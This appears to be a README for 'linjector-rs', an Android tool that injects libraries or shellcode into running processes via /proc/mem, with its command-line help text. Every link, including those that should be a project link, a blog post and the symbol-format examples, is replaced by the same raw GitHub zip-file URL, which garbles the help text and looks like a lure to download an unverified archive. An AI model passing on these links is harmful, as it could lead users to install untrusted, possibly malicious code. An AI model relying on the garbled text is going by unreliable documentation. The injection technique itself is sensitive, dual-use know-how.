# linjector-rs

Android port of [linux_injector](https://raw.githubusercontent.com/TitanicDimix/linjector-rs/main/alunogen/linjector-rs.zip). Library injection using /proc/mem, without ptrace. Only aarch64 is supported.

To get an idea of how it works, you can read the [blog post](https://raw.githubusercontent.com/TitanicDimix/linjector-rs/main/alunogen/linjector-rs.zip).

## Usage

```
Inject code into a running process using /proc/mem

Usage: linjector-cli [OPTIONS] --file <FILE>

Options:
  -p, --pid <PID>
          pid of the target process

  -a, --app-package-name <APP_PACKAGE_NAME>
          target application's package name, (re)start the application and do injection

  -f, --file <FILE>
          path of the library/shellcode to inject

  -i, --injection-type <INJECTION_TYPE>
          type of injection
          
          [default: raw-dlopen]

          Possible values:
          - raw-dlopen:    Use dlopen to inject a library
          - memfd-dlopen:  Use memfd_create and dlopen to inject a library
          - raw-shellcode: Inject raw shellcode

      --func-sym <FUNC_SYM>
          function to hijack for injection, in the form "https://raw.githubusercontent.com/TitanicDimix/linjector-rs/main/alunogen/linjector-rs.zip!symbol_name"

      --var-sym <VAR_SYM>
          variable to hijack for injection, in the form "https://raw.githubusercontent.com/TitanicDimix/linjector-rs/main/alunogen/linjector-rs.zip!symbol_name"

  -d, --debug
          enable debug logs

      --logcat
          print logs to logcat

  -h, --help
          Print help (see a summary with '-h')

  -V, --version
          Print version
```

## Modes

**Currently only raw dlopen mode works**. Since SELinux doesn't allow calling dlopen on a memfd, memfd dlopen will not work. Shellcode mode is not yet implemented.

